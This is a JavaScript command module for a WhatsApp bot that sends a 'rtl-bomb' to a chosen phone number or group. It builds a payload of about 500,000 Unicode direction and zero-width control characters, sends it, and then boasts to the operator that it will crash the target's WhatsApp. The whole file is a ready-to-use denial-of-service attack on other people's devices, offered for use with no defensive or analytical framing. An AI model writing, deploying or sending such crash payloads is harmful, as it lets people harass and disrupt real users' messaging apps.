export default {
  name: "rtl-bomb",
  description: "Send right-to-left override Unicode crash",
  async execute(msg, { sock, args }) {
    try {
      let target = args[0];

      if (!target) {
        return sock.sendMessage(msg.key.remoteJid, {
          text: `⚠️ Usage: ?rtl-bomb <number/group>\n\nExample:\n?rtl-bomb 234XXXXXXXXXX\n?rtl-bomb 120XXXXXXX@g.us`
        });
      }

      // Format target
      if (!target.includes("@g.us") && !target.includes("@s.whatsapp.net")) {
        if (target.length < 11) {
          return sock.sendMessage(msg.key.remoteJid, { 
            text: "⚠️ Invalid number. Use format: 234XXXXXXXXXX" 
          });
        }
        target = target + "@s.whatsapp.net";
      }

      console.log(`[INFO] Executing rtl-bomb on target: ${target}`);

      // Generate RTL bomb payload
      const payload = "\u202E\u200E\u200F\u200D\u200C".repeat(100_000);

      // Send the payload
      await sock.sendMessage(target, { text: payload });

      await sock.sendMessage(msg.key.remoteJid, {
        text: `💀 RTL bomb sent to ${target}!\n📊 Payload size: ${payload.length} characters\n⚠️ WARNING: This WILL crash the target's WhatsApp!`
      });

    } catch (error) {
      console.error(`[ERROR] RTL-bomb command failed:`, error);
      await sock.sendMessage(msg.key.remoteJid, {
        text: "❌ Failed to send RTL bomb: " + error.message
      });
    }
  }
};